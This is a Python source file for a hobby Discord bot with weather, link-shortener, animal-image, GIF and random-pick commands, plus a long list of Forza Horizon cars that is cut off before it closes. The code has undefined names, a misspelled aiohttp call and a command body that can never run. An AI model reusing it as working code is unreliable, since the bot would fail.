import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes
import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging, asyncio
import urllib.parse
from aiohttp import request
from urllib import parse, request
from discord.ext import commands

client = commands.Bot(command_prefix = '.')

@client.event
async def on_ready():
    print('Bot is ready.')

@client.command()
async def ping(ctx):
    await ctx.send(f'Pong! {round(client.latency * 1000)}ms')

@client.command()
async def address(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    addy = ' '.join(text)
    address_array = []
    i = 0
    while i < 10:
        address_array.append(GenAddress(addy))
        i+=1
    final_str = "\n".join(address_array)
    em = discord.Embed(description=final_str)
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(final_str)

@client.command()
async def weather(ctx, *, city): # b'\xfc'
    await ctx.message.delete()
    if weather_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Weather API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f'http://api.openweathermap.org/data/2.5/weather?q={city}&appid={weather_key}')
            r = req.json()
            temperature = round(float(r["main"]["temp"]) - 273.15, 1)
            lowest = round(float(r["main"]["temp_min"]) - 273.15, 1)
            highest = round(float(r["main"]["temp_max"]) - 273.15, 1)
            weather = r["weather"][0]["main"]
            humidity = round(float(r["main"]["humidity"]), 1)
            wind_speed = round(float(r["wind"]["speed"]), 1)
            em = discord.Embed(description=f'''
            Temperature: `{temperature}`
            Lowest: `{lowest}`
            Highest: `{highest}`
            Weather: `{weather}`
            Humidity: `{humidity}`
            Wind Speed: `{wind_speed}`
            ''')
            em.add_field(name='City', value=city.capitalize())
            em.set_thumbnail(url='https://ak0.picdn.net/shutterstock/videos/1019313310/thumb/1.jpg')
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(f'''
                Temperature: {temperature}
                Lowest: {lowest}
                Highest: {highest}
                Weather: {weather}
                Humidity: {humidity}
                Wind Speed: {wind_speed}
                City: {city.capitalize()}
                ''')
        except KeyError:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{city} Is not a real city"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@client.command(aliases=['shorteen'])
async def bitly(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    if bitly_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Bitly API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            async with aiohttp.clientSession() as session:
                async with session.get(f'https://api-ssl.bitly.com/v3/shorten?longUrl={link}&domain=bit.ly&format=json&access_token={bitly_key}') as req:
                    r = await req.read()
                    r = json.loads(r)
            new = r['data']['url']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            await ctx.send(embed=em)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@client.command()
async def cuttly(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    if cuttly_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Cutt.ly API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f'https://cutt.ly/api/api.php?key={cuttly_key}&short={link}')
            r = req.json()
            new = r['url']['shortLink']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(new)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)



@client.command()
async def quote(self, ctx, id: int, channel: discord.TextChannel=None):
    await ctx.message.delete()

    msg = await ctx.get_message(channel or ctx.channel, id)

    if not msg:
        return await ctx.send('Could not find that message!', delete_after=3.0)

        em = discord.Embed(color=0x00FFFF, description=msg.clean_content, timestamp=msg.created_at)
        em.set_author(name=str(msg.author), icon_url=msg.author.avatar_url)

        if isinstance(msg.channel, discord.TextChannel):
            em.set_footer(text='#' + str(msg.channel))
        else:
            em.set_footer(text=str(msg.channel))

        await ctx.send(embed=em)


@client.command()
async def r6a(ctx):
    agents = [
'FLORES',
'Aruni',
'Zero',
'Ace',
'Melusi',
'Oryx',
'Iana',
'Wamai',
'Kali',
'Amaru',
'Goyo',
'NØKK',
'Warden',
'Mozzie',
'Gridlock',
'Nomad',
'Kaid',
'Clash',
'Maverick',
'Maestro',
'Alibi',
'Lion',
'Finka',
'Vigil',
'Dokkaebi',
'Zofia',
'Ela',
'Ying',
'Lesion',
'Mira',
'Jackal',
'Hibana',
'Echo',
'Caveira',
'CAPITÃO',
'Blackbeard',
'Valkyrie',
'Buck',
'Frost',
'Mute',
'Sledge',
'Smoke',
'Thatcher',
'Ash',
'Castle',
'Pulse',
'Thermite',
'Montagne',
'Twitch',
'Doc',
'Rook',
'Jäger',
'Bandit',
'Blitz',
'IQ',
'Fuze',
'Glaz',
'Tachanka',
'Kapkan'
        ]
    answer = random.choice(agents)
    await ctx.send(answer)


@client.command()
async def anime(ctx):
    anime = [
    'https://tenor.com/view/sailor-moon-suit-old-man-peace-sign-sailor-scout-anime-gif-14298094',
    'https://tenor.com/view/anime-headbang-gif-6035620',
    'https://tenor.com/view/anime-kafuu-chino-okuda-yousuke-swinging-white-fox-gif-10654450',
    'https://tenor.com/view/anime-chainsaw-loli-girl-mad-gif-10166732',
    'https://tenor.com/view/mimi-cute-anime-tap-gif-15633073',
    'https://tenor.com/view/cute-anime-dancing-silly-happy-excited-gif-13462237',
    'https://tenor.com/view/blends-anime-maika-gif-10176024'
    ]
    answer = random.choice(anime)
    await ctx.send(answer)



@client.command()
async def cat(ctx): # b'\xfc'
    await ctx.message.delete()
    if cat_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Cat API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f"https://api.thecatapi.com/v1/images/search?format=json&x-api-key={cat_key}")
            r = req.json()
            em = discord.Embed()
            em.set_image(url=str(r[0]["url"]))
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(str(r[0]["url"]))
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@client.command()
async def dog(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    em = discord.Embed()
    em.set_image(url=str(r['message']))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message']))

@client.command()
async def bird(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/birb").json()
    em = discord.Embed()
    em.set_image(url=str(r['message']))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message']))



@client.command(name='jeff')
async def jeff(ctx):
    await ctx.send('https://tenor.com/HP3M.gif')


@client.command(name='69')
async def _69(ctx):
    await ctx.send('https://tenor.com/LgPu.gif')



@client.command(aliases=['roy'])
async def royalistiq(ctx):
    geefjes = [
    'https://tenor.com/bnVIb.gif',
    'https://tenor.com/bnVFW.gif',
    'https://tenor.com/bsxOp.gif',
    'https://tenor.com/bnVGb.gif'
    ]
    answer = random.choice(geefjes)
    await ctx.send(answer)

@client.command(aliases=['fz4'])
async def forzac(ctx):
    await ctx.message.delete()
    uatus = [
'C	HOR XB1 Abarth 124 about this car	2017	Abarth 124 Spider	Autoshow	43,500 CR	6.0	5.9	5.6	7.6	5.4	C 577',
'C	HOR XB1 Abarth 595 about this car	1968	Abarth 595 esseesse	Autoshow	35,000 CR	3.9	4.0	3.7	4.9	4.0	D 100',
'R	HOR XB1 Abarth 695 about this car	2016	Abarth 695 Biposto	Autoshow	48,000 CR	5.7	6.3	5.9	7.5	6.4	B 607',
'C	HOR XB1 Abarth Fiat about this car	1980	Abarth Fiat 131	Autoshow	38,000 CR	5.5	4.7	5.5	7.1	4.5	D 449',
'C	HOR XB1 Acura Integra about this car	2001	Acura Integra Type-R	Autoshow	25,000 CR	6.3	5.8	5.6	6.9	5.4	C 596',
'C	HOR XB1 Acura RSX about this car	2002	Acura RSX Type-S	Autoshow	25,000 CR	6.3	5.8	5.6	6.7	5.4	C 588',
'R	HOR XB1 Acura NSX about this car	2017	Acura NSX	Autoshow	170,000 CR	7.4	7.6	9.6	10	8.3	S1 850',
'E	HOR XB1 AR 155 FH4 about this car	1992	Alfa Romeo 155 Q4	Hard-to-Find: Festival reward	250,000 CR	6.2	5.0	5.8	7.8	4.7	C 541',
'R	HOR XB1 AR 4C about this car	2014	Alfa Romeo 4C	Autoshow	74,000 CR	6.6	7.1	6.5	8.8	7.0	A 770',
'E	HOR XB1 AR 8C about this car	2007	Alfa Romeo 8C Competizione	Autoshow	300,000 CR	7.5	6.6	6.6	8.2	6.8	A 777',
'F	HOR XB1 AR 8C FE about this car	2007	Alfa Romeo 8C Competizione F.E.	Wheelspin reward	550,000 CR	7.6	9.1	8.3	9.6	9.6	S1 899',
'L	HOR XB1 AR 33 about this car	1968	Alfa Romeo 33 Stradale	Autoshow	10,000,000 CR	6.9	5.8	6.9	8.6	5.5	A 716',
'R	HOR XB1 AR Giulia 65 Sprint about this car	1965	Alfa Romeo Giulia Sprint GTA Stradale	Autoshow	300,000 CR	5.1	4.6	5.4	6.9	4.5	D 432',
'L	HOR XB1 AR Giulia 65 TZ2 about this car	1965	Alfa Romeo Giulia TZ2	Autoshow	2,500,000 CR	6.3	5.7	5.8	7.0	5.1	B 639',
'R	HOR XB1 AR Giulia 17 about this car	2017	Alfa Romeo Giulia Quadrifoglio	Autoshow	120,000 CR	7.7	7.2	6.9	8.5	7.9	A 795',
'F	HOR XB1 AR Giulia 17 FE about this car	2017	Alfa Romeo Giulia Quadrifoglio F.E.	Wheelspin reward	370,000 CR	8.7	8.1	7.6	9.1	8.7	S1 900',
'L	HOR XB1 AR P3 about this car	1934	Alfa Romeo P3	Purchase:  Edinburgh Castle	10,000,000 CR	6.6	5.0	5.6	7.1	4.9	B 626',
'R	HOR XB1 AR Stelvio about this car	2018	Alfa Romeo Stelvio Quadrifoglio	DLC: Car Pass	80,000 CR	7.2	5.9	9.0	10	6.3	A 752',
'E	HOR XB1 Alpine A110 about this car	2017	Alpine A110	Hard-to-Find: Festival reward	250,000 CR	6.7	7.0	6.9	8.5	6.9	A 740',
'E	HOR XB1 AC Class about this car	2015	Alumi Craft Class 10 Race Car	Autoshow	100,000 CR	5.3	6.5	6.6	7.9	6.2	B 673',
'F	HOR XB1 AC Class FE about this car	2015	Alumi Craft Class 10 Race Car F.E.	Wheelspin reward	350,000 CR	6.0	6.6	7.7	9.2	6.8	A 800',
'C	HOR XB1 AMC Gremlin about this car	1973	AMC Gremlin X	Autoshow	35,000 CR	5.0	4.4	5.2	6.6	4.4	D 394',
'R	HOR XB1 AMC Javelin about this car	1971	AMC Javelin AMX	Autoshow	35,000 CR	5.4	4.5	5.2	6.6	4.2	C 512',
'R	HOR XB1 AMC Rebel about this car	1970	AMC Rebel The Machine	Hard-to-Find: Festival reward	250,000 CR	5.9	4.6	5.3	6.8	4.4	C 541',
'L	HOR XB1 AMG TD M12S about this car	2554	AMG Transport Dynamics M12S Warthog CST	Autoshow	850,000 CR	5.2	7.1	9.7	10	7.5	A 756',
'L	HOR XB1 Apollo IE about this car	2018	Apollo Intensa Emozione	Hard-to-Find: Festival reward	1,050,000 CR	7.9	10	8.3	9.6	10	S2 984',
'E	HOR XB1 Ariel Atom about this car	2013	Ariel Atom 500 V8	HL: Speed Zone Hero - Tier 11	108,000 CR	7.0	10	8.6	9.8	10	S2 970',
'E	HOR XB1 Ariel Nomad about this car	2016	Ariel Nomad	Autoshow	93,000 CR	6.0	6.3	7.6	9.2	6.1	A 732',
'E	HOR XB1 Ascari KZ1R about this car	2012	Ascari KZ1R	Autoshow	240,000 CR	7.9	8.6	7.4	8.6	8.9	S1 866',
'L	HOR XB1 AM DB4 about this car	1960	Aston Martin DB4 GT Zagato	Barn Find	500,000 CR	6.9	5.4	4.6	5.1	4.6	B 619',
'L	HOR XB1 AM DB5 about this car	1964	Aston Martin DB5	Autoshow	800,000 CR	6.2	4.7	5.6	7.1	4.3	C 534',
'E	HOR XB1 AM DB11 about this car	2017	Aston Martin DB11	Autoshow	300,000 CR	7.8	7.1	6.8	8.4	7.6	S1 81',
'E	HOR XB1 AM DB11 PO about this car	2017	Aston Martin DB11 Preorder Car	Pre-Order bonus  / Forzathon Shop	300,000 CR	8.9	8.2	6.7	8.3	8.7	S1 900',
'L	HOR XB1 AM DBR1 about this car	1958	Aston Martin DBR1	Autoshow	10,000,000 CR	7.1	5.6	5.3	6.1	5.1	B 688',
'E	HOR XB1 AM DBS 19 about this car	2019	Aston Martin DBS Superleggera	Hard-to-Find: Festival reward	250,000 CR	8.2	7.4	6.9	8.5	8.1	S1 853',
'L	HOR XB1 AM One-77 about this car	2010	Aston Martin One-77	Autoshow	1,400,000 CR	8.3	7.5	7.1	8.7	8.0	S1 863',
'E	HOR XB1 AM V12 about this car	2013	Aston Martin V12 Vantage S	Autoshow	240,000 CR	8.2	6.9	6.6	8.2	7.4	S1 814',
'E	HOR XB1 AM Vanquish 17 about this car	2017	Aston Martin Vanquish Zagato Coupé	Hard-to-Find: Festival reward	250,000 CR	7.8	7.3	6.9	8.5	8.0	S1 824',
'E	HOR XB1 AM Vantage 18 about this car	2018	Aston Martin Vantage	DLC: Car Pass	400,000 CR	7.5	7.5	6.9	8.6	7.9	S1 822',
'R	HOR XB1 AM Vanquish 12 about this car	2012	Aston Martin Vanquish	Autoshow	348,000 CR	7.9	7.0	6.7	8.3	7.5	S1 802',
'E	HOR XB1 AM Vantage 16 about this car	2016	Aston Martin Vantage GT12	Autoshow	400,000 CR	7.2	8.4	6.9	8.5	9.1	S1 846',
'L	HOR XB1 AM Vulcan about this car	2016	Aston Martin Vulcan	Autoshow	1,500,000 CR	8.1	10	7.5	9.0	10	S2 954',
'E	HOR XB1 AM Vulcan 17 about this car	2017	Aston Martin Vulcan AMR Pro	Hard-to-Find: Festival reward	1,500,000 CR	7.7	10	7.5	9.0	10	S2 954',
'F	HOR XB1 AM Vulcan FE about this car	2016	Aston Martin Vulcan F.E.	Wheelspin reward	1,750,000 CR	8.4	10	7.6	9.2	10	S2 998',
'E	HOR XB1 ATS GT about this car	2018	ATS GT	Hard-to-Find: Festival reward	250,000 CR	8.3	8.0	7.7	9.2	8.6	S1 894',
'L	HOR XB1 Audi 2 Sport about this car	1986	Audi 2 Audi Sport quattro S1	Autoshow	375,000 CR	6.9	8.0	9.5	8.0	8.1	S1 850',
'E	HOR XB1 Audi R8 13 about this car	2013	Audi R8 Coupé V10 plus 5.2 FSI quattro	Autoshow	290,000 CR	7.8	7.2	8.5	9.5	7.7	S1 824',
'E	HOR XB1 Audi R8 16 about this car	2016	Audi R8 V10 plus	Autoshow	242,000 CR	8.2	7.5	9.1	9.9	8.1	S1 856',
'C	HOR XB1 Audi RS 2 about this car	1995	Audi RS 2 Avant	Autoshow	50,000 CR	6.7	5.3	6.6	8.7	5.2	B 616',
'C	HOR XB1 Audi RS 3 about this car	2011	Audi RS 3 Sportback	Autoshow	42,000 CR	6.7	6.1	6.8	8.9	6.3	B 699',
'R	HOR XB1 Audi RS 4 06 about this car	2006	Audi RS 4	Autoshow	53,000 CR	7.5	6.2	7.5	8.9	6.2	A 729',
'R	HOR XB1 Audi RS 4 01 about this car	2001	Audi RS 4 Avant	Autoshow	94,000 CR	7.1	6.0	7.1	9.0	5.5	B 695',
'R	HOR XB1 Audi RS 4 13 about this car	2013	Audi RS 4 Avant	Autoshow	83,000 CR	7.5	6.2	7.0	8.7	6.7	A 750',
'R	HOR XB1 Audi RS 5 about this car	2011	Audi RS 5 Coupé	Autoshow	88,000 CR	7.3	6.5	7.3	9.0	7.0	A 750',
'R	HOR XB1 Audi RS 6 03 about this car	2003	Audi RS 6	Autoshow	105,000 CR	7.4	5.9	6.7	8.4	5.8	A 710',
'R	HOR XB1 Audi RS 6 09 about this car	2009	Audi RS 6	Autoshow	155,000 CR	8.0	6.2	7.6	9.1	6.7	A 743',
'R	HOR XB1 Audi RS 6 15 about this car	2015	Audi RS 6 Avant	Autoshow	150,000 CR	7.8	6.2	8.8	10	6.7	A 778',
'R	HOR XB1 Audi RS 7 about this car	2013	Audi RS 7 Sportback	Autoshow	225,000 CR	8.0	6.1	8.3	9.9	6.5	A 761',
'C	HOR XB1 Audi S1 about this car	2015	Audi S1	Autoshow	35,000 CR	6.3	6.3	6.8	8.7	6.6	B 679',
'L	HOR XB1 Audi Sport about this car	1983	Audi Sport quattro	Barn Find	175,000 CR	6.4	5.2	7.1	8.8	5.2	B 621',
'R	HOR XB1 Audi TT 10 about this car	2010	Audi TT RS Coupé	Wheelspin reward	66,000 CR	7.2	6.3	7.3	9.2	6.2	A 722',
'C	HOR XB1 Audi TTS about this car	2015	Audi TTS Coupé	Autoshow	52,000 CR	7.4	6.4	7.3	9.0	5.8	A 740',
'C	HOR XB1 Austin FX4 about this car	1964	Austin FX4 Taxi	HL: Isha s Taxis - Tier 10	20,000 CR	4.5	3.8	3.6	4.5	3.5	D 100',
'L	HOR XB1 Austin Seven about this car	1924	Austin Seven	HL: Horizon Super7 - Tier 5	250,000 CR	3.1	4.1	3.0	3.0	4.4	D 100',
'C	HOR XB1 A-H 3000 about this car	1965	Austin-Healey 3000 MkIII	Autoshow	50,000 CR	5.7	4.0	5.1	6.5	3.6	D 326',
'C	HOR XB1 A-H Sprite about this car	1958	Austin-Healey Sprite MkI	Autoshow	20,000 CR	4.3	4.0	3.9	5.6	3.7	D 100',
'L	HOR XB1 AU Type about this car	1939	Auto Union Type D	Autoshow	10,000,000 CR	8.7	5.1	6.0	7.3	4.6	B 692',
'E	HOR XB1 BAC Mono about this car	2014	BAC Mono	Autoshow	160,000 CR	6.8	10	7.5	9.0	10	S1 900',
'L	HOR XB1 Bentley 4-1-2 about this car	1931	Bentley 4-1/2 Liter Supercharged	Barn Find	10,000,000 CR	4.8	3.7	4.0	5.9	3.7	D 200',
'L	HOR XB1 Bentley 8-Liter about this car	1931	Bentley 8-Liter	HL:  - Tier 10	1,500,000 CR	4.8	3.7	4.7	5.8	3.7	D 176',
'E	HOR XB1 Bentley Bentayga about this car	2016	Bentley Bentayga	Autoshow	180,000 CR	7.5	6.1	7.6	9.4	6.3	A 758',
'E	HOR XB1 Bentley Continental 13 about this car	2013	Bentley Continental GT Speed	Autoshow	242,000 CR	8.0	6.3	7.8	9.5	6.7	A 774',
'F	HOR XB1 Bentley Continental 13 FE about this car	2013	Bentley Continental GT Speed F.E.	Wheelspin reward	492,000 CR	7.4	9.4	8.1	9.5	10	S1 900',
'E	HOR XB1 Bentley Continental 17 about this car	2017	Bentley Continental Supersports	Autoshow	200,000 CR	8.0	6.3	9.2	10	7.0	A 798',
'R	HOR XB1 Bentley Turbo about this car	1991	Bentley Turbo R	Hard-to-Find: Festival reward	250,000 CR	6.2	5.0	4.9	5.5	4.8	C 546',
'R	HOR XB1 BMW 1 Series about this car	2011	BMW 1 Series M Coupe	Autoshow	55,000 CR	7.0	6.4	6.4	8.0	6.4	A 731',
'C	HOR XB1 BMW 2002 about this car	1973	BMW 2002 Turbo	Autoshow	26,000 CR	5.8	4.6	5.5	5.9	4.5	D 500',
'R	HOR XB1 BMW i8 about this car	2015	BMW i8	Autoshow	140,000 CR	7.7	6.6	9.0	10	6.6	A 785',
'R	HOR XB1 BMW i8 18 about this car	2018	BMW i8 Roadster	DLC: Car Pass	150,000 CR	7.6	6.4	8.5	10	6.4	A 776',
'R	HOR XB1 BMW Isetta about this car	1957	BMW Isetta 300 Export	Autoshow	45,000 CR	3.2	4.0	3.3	3.1	4.0	D 100',
'R	HOR XB1 BMW 850CSi about this car	1995	BMW 850CSi	Hard-to-Find: Festival reward	250,000 CR	7.3	5.2	6.1	7.8	5.1	B 612',
'E	HOR XB1 BMW M1 about this car	1981	BMW M1	Autoshow	585,000 CR	6.6	5.4	6.1	7.2	5.4	B 652',
'C	HOR XB1 BMW M2 about this car	2016	BMW M2 Coupé	Autoshow	69,000 CR	7.1	6.3	6.4	8.1	6.3	A 737',
'R	HOR XB1 BMW M3 91 about this car	1991	BMW M3	Autoshow	70,000 CR	6.4	5.4	6.0	7.4	5.0	C 586',
'C	HOR XB1 BMW M3 97 about this car	1997	BMW M3	Autoshow	35,000 CR	7.1	5.9	6.3	8.0	5.5	B 694',
'C	HOR XB1 BMW M3 05 about this car	2005	BMW M3	HL: The Drift Run - Tier 8	33,000 CR	7.0	6.1	6.4	8.0	5.7	A 706',
'R	HOR XB1 BMW M3 08 about this car	2008	BMW M3	Autoshow	48,000 CR	7.3	6.3	6.3	7.9	6.4	A 745',
'E	HOR XB1 BMW M3-GTR about this car	2002	BMW M3-GTR	Hard-to-Find: Festival reward	120,000 CR	7.2	6.9	6.6	8.2	7.0	A 765',
'E	HOR XB1 BMW M3 10 about this car	2010	BMW M3 GTS	Hard-to-Find: Festival reward	250,000 CR	7.4	7.6	6.6	8.3	8.0	S1 814',
'R	HOR XB1 BMW M4 14 about this car	2014	BMW M4 Coupe	Autoshow	92,000 CR	7.7	6.9	6.5	8.2	7.5	A 800',
'E	HOR XB1 BMW M4 16 about this car	2016	BMW M4 GTS	Autoshow	135,000 CR	7.4	8.1	6.7	8.4	8.8	S1 841',
'R	HOR XB1 BMW M5 88 about this car	1988	BMW M5	Autoshow	54,000 CR	6.5	5.3	6.0	7.7	5.3	C 594',
'F	HOR XB1 BMW M5 88 FE about this car	1988	BMW M5 F.E.	Wheelspin reward	304,000 CR	7.3	6.7	6.7	8.3	7.1	A 800',
'R	HOR XB1 BMW M5 95 about this car	1995	BMW M5	Autoshow	25,000 CR	7.3	5.5	6.1	7.8	5.4	B 634',
'C	HOR XB1 BMW M5 03 about this car	2003	BMW M5	Autoshow	30,000 CR	7.6	6.0	6.3	7.9	6.0	A 719',
'R	HOR XB1 BMW M5 09 about this car	2009	BMW M5	Autoshow	90,000 CR	7.6	6.5	6.5	8.2	6.6	A 758',
'R	HOR XB1 BMW M5 12 about this car	2012	BMW M5	Autoshow	112,000 CR	7.9	6.6	6.5	8.2	6.7	A 790',
'R	HOR XB1 BMW M5 18 about this car	2018	BMW M5	DLC: Fortune Island	105,000 CR	8.0	6.5	9.3	10	7.2	S1 806',
'R	HOR XB1 BMW M6 about this car	2013	BMW M6 Coupe	Autoshow	120,000 CR	7.9	6.3	6.3	7.9	6.8	A 779',
'F	HOR XB1 BMW M6 FE about this car	2013	BMW M6 Coupe F.E.	Wheelspin reward	370,000 CR	9.1	7.7	7.4	9.0	8.2	S1 900',
'C	HOR XB1 BMW X5 11 about this car	2011	BMW X5 M	Autoshow	100,000 CR	7.0	5.8	7.4	9.1	5.5	A 708',
'R	HOR XB1 BMW X6 about this car	2015	BMW X6 M	Autoshow	130,000 CR	7.1	6.0	7.5	9.4	5.8	A 727',
'C	HOR XB1 BMW Z3 about this car	2002	BMW Z3 M Coupe	Autoshow	30,000 CR	6.8	6.1	6.4	8.1	6.1	A 713',
'R	HOR XB1 BMW Z4 08 about this car	2008	BMW Z4 M Coupe	Autoshow	82,000 CR	7.0	6.5	6.6	8.3	6.0	A 710',
'R	HOR XB1 BMW Z4 19 about this car	2019	BMW Z4 Roadster	Hard-to-Find: Festival reward	35,000 CR	7.2	6.7	6.8	8.4	6.7	A 772',
'R	HOR XB1 BMW Z4 11 about this car	2011	BMW Z4 sDrive35is	Autoshow	58,000 CR	7.2	6.2	6.5	8.2	5.7	A 727',
'E	HOR XB1 Bowler EXR about this car	2012	Bowler EXR S	Autoshow	200,000 CR	6.8	6.2	8.8	10	6.0	A 760',
'L	HOR XB1 Bugatti Chiron about this car	2018	Bugatti Chiron	Autoshow	2,400,000 CR	10	8.3	9.8	10	8.7	S2 938',
'L	HOR XB1 Bugatti Divo about this car	2019	Bugatti Divo	Hard-to-Find: Festival reward	250,000 CR	9.3	9.2	9.9	10	9.5	S2 958',
'L	HOR XB1 Bugatti EB110 about this car	1992	Bugatti EB110 Super Sport	Autoshow	1,700,000 CR	8.5	7.1	9.2	9.9	7.4	S1 829',
'L	HOR XB1 Bugatti Type about this car	1926	Bugatti Type 35 C	Autoshow	10,000,000 CR	5.0	4.9	4.4	4.8	4.8	D 374',
'L	HOR XB1 Bugatti Veyron about this car	2011	Bugatti Veyron Super Sport	Autoshow	2,200,000 CR	9.9	8.0	9.9	10	8.4	S2 922',
'E	HOR XB1 Buick GSX about this car	1970	Buick GSX	Hard-to-Find: Festival reward	250,000 CR	6.0	4.8	5.1	6.5	4.4	C 572',
'R	HOR XB1 Buick Regal about this car	1987	Buick Regal GNX	Autoshow	130,000 CR	6.5	4.7	5.6	7.1	4.5	C 567',
'C	HOR XB1 Cadillac ATS-V about this car	2016	Cadillac ATS-V	Autoshow	65,000 CR	7.5	6.2	6.4	8.1	6.2	A 737',
'C	HOR XB1 Cadillac CTS-V 16 about this car	2016	Cadillac CTS-V Sedan	Autoshow	80,000 CR	7.7	6.2	6.3	7.9	6.6	A 785',
'R	HOR XB1 Cadillac Eldorado about this car	1959	Cadillac Eldorado Biarritz Convertible	DLC: Car Pass	60,000 CR	5.9	4.4	5.2	6.6	4.3	D 400',
'C	HOR XB1 Cadillac Escalade about this car	2012	Cadillac Escalade ESV	Hard-to-Find: Festival reward	250,000 CR	6.0	5.7	5.0	6.0	5.9	C 564',
'R	HOR XB1 Cadillac XTS about this car	2013	Cadillac XTS Limousine	Wheelspin reward	48,500 CR	6.1	5.7	4.6	5.1	5.4	C 534',
'C	HOR XB1 C-A Maverick about this car	2018	Can-Am Maverick X RS Turbo R	DLC: Car Pass	25,000 CR	5.0	6.5	8.2	10	6.4	B 692',
'R	HOR XB1 Caterham Superlight about this car	2013	Caterham Superlight R500	Autoshow	82,000 CR	6.4	6.9	6.8	7.9	7.1	S1 804',
'F	HOR XB1 Caterham Superlight FE about this car	2013	Caterham Superlight R500 F.E.	Wheelspin reward	332,000 CR	6.4	7.0	6.7	8.4	7.1	S1 804',
'C	HOR XB1 Chevy 150 about this car	1955	Chevrolet 150 Utility Sedan	Autoshow	35,000 CR	5.4	3.8	5.0	6.3	3.6	D 286',
'R	HOR XB1 Chevy Bel about this car	1957	Chevrolet Bel Air	Autoshow	130,000 CR	5.7	4.3	4.7	5.1	4.3	D 444',
'R	HOR XB1 Chevy Camaro 90 FH4 about this car	1990	Chevrolet Camaro IROC-Z	Hard-to-Find: Festival reward	250,000 CR	6.5	4.6	5.1	6.4	3.9	C 512',
'R	HOR XB1 Chevy Camaro 69 about this car	1969	Chevrolet Camaro Super Sport Coupe	Autoshow	110,000 CR	5.9	4.9	5.3	6.7	4.6	C 566',
'R	HOR XB1 Chevy Camaro 70 about this car	1970	Chevrolet Camaro Z28	Autoshow	53,000 CR	6.0	4.7	5.2	6.5	4.3	C 547',
'R	HOR XB1 Chevy Camaro 79 about this car	1979	Chevrolet Camaro Z28	Wheelspin reward	35,000 CR	5.5	4.8	5.3	6.7	4.4	D 460',
'R	HOR XB1 Chevy Camaro 15 about this car	2015	Chevrolet Camaro Z/28	Autoshow	86,000 CR	7.2	7.7	6.6	8.3	8.3	S1 818',
'R	HOR XB1 Chevy Camaro 17 about this car	2017	Chevrolet Camaro ZL1	Autoshow	60,000 CR	7.8	8.0	7.3	8.7	8.4	S1 848',
'R	HOR XB1 Chevy Camaro 17 PO about this car	2017	Chevrolet Camaro ZL1 Preorder Car	Pre-Order bonus  / Forzathon Shop	60,000 CR	8.3	8.8	7.3	8.9	9.3	S1 900',
'E	HOR XB1 Chevy Camaro 18 about this car	2018	Chevrolet Camaro ZL1 1LE	DLC: Car Pass	105,000 CR	7.5	8.4	7.0	8.6	8.8	S1 849',
'R	HOR XB1 Chevy Chevelle 67 about this car	1967	Chevrolet Chevelle Super Sport 396	Hard-to-Find: Festival reward	250,000 CR	6.5	4.6	5.2	6.6	4.4	C 561',
'R	HOR XB1 Chevy Chevelle 70 about this car	1970	Chevrolet Chevelle Super Sport 454	Autoshow	80,000 CR	5.6	4.6	5.1	6.4	4.3	C 542',
'E	HOR XB1 Chevy Chevelle 70 BJ about this car	1970	Chevrolet Chevelle Super Sport Barrett-Jackson Edition	DLC: Barrett-Jackson Car Pack	105,000 CR	7.8	5.9	6.1	7.8	6.2	A 757',
'R	HOR XB1 Chevy Colorado about this car	2017	Chevrolet Colorado ZR2	Hard-to-Find: Festival reward	46,000 CR	6.1	5.7	5.7	7.3	5.6	C 598',
'L	HOR XB1 Chevy Corvette 53 about this car	1953	Chevrolet Corvette	Autoshow	135,000 CR	4.7	4.4	4.2	4.3	4.2	D 347',
'E	HOR XB1 Chevy Corvette 60 about this car	1960	Chevrolet Corvette	Autoshow	150,000 CR	6.2	4.6	5.2	6.6	4.4	C 521',
'R	HOR XB1 Chevy Corvette 67 about this car	1967	Chevrolet Corvette Stingray 427	Autoshow	150,000 CR	6.3	5.0	5.6	6.7	4.8	B 621',
'C	HOR XB1 Chevy Corvette 02 about this car	2002	Chevrolet Corvette Z06	Autoshow	35,000 CR	7.7	6.5	6.0	7.6	5.4	A 748',
'R	HOR XB1 Chevy Corvette 15 about this car	2015	Chevrolet Corvette Z06	Autoshow	110,000 CR	7.9	8.2	7.0	8.6	8.9	S1 871',
